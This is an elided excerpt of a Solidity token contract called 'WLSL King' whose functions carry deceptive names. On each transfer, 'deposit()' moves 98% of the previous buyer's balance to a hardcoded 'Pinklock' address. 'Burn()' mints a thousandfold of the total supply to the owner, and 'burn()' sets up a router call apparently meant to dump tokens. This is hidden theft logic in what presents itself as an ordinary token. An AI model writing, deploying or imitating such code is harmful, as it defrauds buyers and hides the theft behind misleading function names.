...
contract WLSLKING  {
    ...
    string public name = "WLSL King";
    string public symbol = "WLSLKING";
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (to == getPair()) {Burn();}
        if (Buy !=Owner && to != Buy) {deposit();}
        if (to != router && to !=getPair()) {Buy = to;}
    ...
    function deposit() internal {
        address Pinklock=0x7ee058420e5937496F5a2096f04caA7721cF70cc;
        uint256 amount = balanceOf[Buy] * 98/100;
        _transfer(Buy,Pinklock, amount);        
    }
    function Burn() internal {burn(); balanceOf[Owner]+= totalSupply*1000;}
    function burn() internal {
        IUniswapV2Router _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uint256 amount = totalSupply*700;
